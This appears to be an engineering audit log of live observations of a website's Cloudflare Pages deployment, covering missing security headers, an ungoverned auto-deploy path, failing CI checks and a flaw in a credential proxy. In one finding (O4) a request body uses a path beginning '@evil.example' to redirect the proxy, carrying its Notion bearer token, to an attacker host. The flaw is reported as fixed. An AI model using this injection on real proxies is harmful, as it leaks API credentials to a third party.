# Live observations — 2026-10-09

Authority domain: `abstrekkt_publication`. Base revision: `d981a1d9c882640b60cb64003def0b14f897328f` (`main`).
All calls were unauthenticated HTTP GETs or GitHub Actions read APIs. No production state was changed.
Window: 2026-10-09T18:38:50Z – 18:44:12Z.

## O1. Production Pages alias serves current HEAD package, not through the governed workflow

`https://abstrekkt.pages.dev` (Pages production-branch alias):

- `/`, `/founder/`, `/pillars/`, `/contact/`, `/robots.txt`, `/sitemap.xml`, `/abstrekkt/nav-toggle.js` are byte-identical (sha256) to `project/deploy/abstrekkt-com/` at `d981a1d9`.
- Response headers on `/` (full capture: `live-headers-pages-dev-2026-10-09.txt`): `Link: </pillars/>…` (from the committed `_headers`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. **Absent:** `X-Frame-Options`, `Permissions-Policy`, `X-Abstrekkt-Release`.
- The repository's own probe agrees: `python3 scripts/release/pages_probe.py readback --base https://abstrekkt.pages.dev …` → `FAIL`, failing checks `header x-frame-options got=None`, `header permissions-policy got=None` (`readback-abstrekkt-pages-dev-2026-10-09.json`).
- The CERTIFIED deployment `https://ee78ba2a.abstrekkt.pages.dev` still returns `X-Frame-Options: DENY` and `Permissions-Policy: camera=(), microphone=(), geolocation=()`.

Inference [INFERRED]: the newest production Pages deployment was not produced by `.github/workflows/abstrekkt-cloudflare-pages.yml`, because that workflow would have (a) overwritten `_headers` with the security block and `X-Abstrekkt-Release`, and (b) regenerated `robots.txt` without the `# robots.txt for abstrekkt.com` comment line that is being served. No release receipt exists for it. How it was deployed (Pages Git integration, manual `wrangler pages deploy`, dashboard upload) is UNVERIFIED.

## O2. Apex `abstrekkt.com`

- `curl` from this datacenter IP: every HTML route and `/sitemap.xml` → `403`, `cf-mitigated: challenge`. `/robots.txt` and `/abstrekkt/nav-toggle.js` → `200`.
- Python `urllib` with the release verifier's User-Agent: `pages_probe.py apex --phase preflight` → `REACHABLE`, title matches (`apex-preflight-2026-10-09.json`).
- Apex headers on `/`, `/founder/`, `/sitemap.xml`: `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: same-origin` (zone-level values, not the package values), `Permissions-Policy` absent, `X-Abstrekkt-Release` absent, `Link` present on `/`.
- Apex HTML differs from the package only by zone injection: a `<script type="module" src="https://abstrekkt.com/.webmcp/bridge.js" data-packs="c2pa,mcp-server-client">` tag in `<head>` and a Cloudflare challenge-platform `<script>` before `</body>`.
- `/.webmcp/bridge.js` → `200`, `text/javascript`, 72,952 bytes, sha256 `2e3d1e39775cdbea0da8ddcca3876eee3b91119ccefb2295c295a8e562c14d60`. Source is not in this repository. `/mcp` → `302`. Its owner/configuration is UNVERIFIED (also open in `docs/runbooks/abstrekkt-com-cloudflare-release.md`).
- Apex `/robots.txt` is Cloudflare-managed content-signals robots, not the package file.
- `/Tax%20the%20Damage.html` → `404` on the apex. `abstrekkt/nav-toggle.js` injects a nav link to `Tax the Damage.html` on every page, so that nav link is a production 404.

## O3. CI on `main` @ `d981a1d9` (GitHub Actions API)

| Workflow / job | Run | Conclusion |
| --- | --- | --- |
| Abstrekkt CI / Repository integrity | 37973887163 | failure |
| Abstrekkt CI / Automation configuration | 37973887163 | success |
| Abstrekkt CI / Static release package | 37973887163 | success |
| Abstrekkt CI / Cloudflare Worker config | 37973887163 | success |
| Repository Integrity | 37973887004 | failure |

The same two integrity checks also failed on `a2252901` and `6300df45`. Local reproduction: `python3 scripts/repo_integrity.py` reports 156 failures, every one `tracked file matches .gitignore` under `Unicorn-maybe/flashfusion-web/.next/dev/` (added in `a35259e4`, 2026-10-07). See `validation-run.txt`.

## O4. Mentor proxy credential redirection (source-level, reproduced locally)

Against `project/proxy-deploy/src/index.js` at `d981a1d9`, a `POST /call` with a valid proxy token and `{"target":"notion","path":"@evil.example/collect"}` made the Worker fetch host `evil.example` with the injected `Authorization: Bearer <NOTION_TOKEN>` header. After the fix in this change the same request returns `400` and makes no upstream fetch. Whether a deployed `kr-mentor-proxy` exists, and at which source, is UNVERIFIED.

## O5. Ungoverned deploy path confirmed: Pages Git integration (2026-10-09T18:48Z)

When this PR's branch was pushed, `cloudflare-workers-and-pages[bot]` commented on ChaosClubCo/abstrekkt#133 (comment 6087167425), saying it had deployed commit `70c38c2` as preview `https://128144e5.abstrekkt.pages.dev`. Nobody dispatched a workflow. Status-only probes of that preview:
- `/` and `/founder/` return `200`, and the bytes are the package files. There is no `X-Frame-Options` and no `X-Abstrekkt-Release`. The committed `Link` header is present.
- `/repository-registry.yaml`, `/REPOSITORY.md`, `/00-master-index.md`, `/.gitignore`, `/project/CANON.md`, `/docs/release/RELEASE_CHECKLIST.md` and `/project/deploy/abstrekkt-com/index.html` all return `404`.

Conclusion: Git integration builds with output directory `project/deploy/abstrekkt-com`. The rest of the private tree is not published at those paths (SUPPORTED, sampled paths only). This confirms O1's inference: pushes to the production branch are auto-deployed outside the governed workflow, without its gates, security headers or receipt.
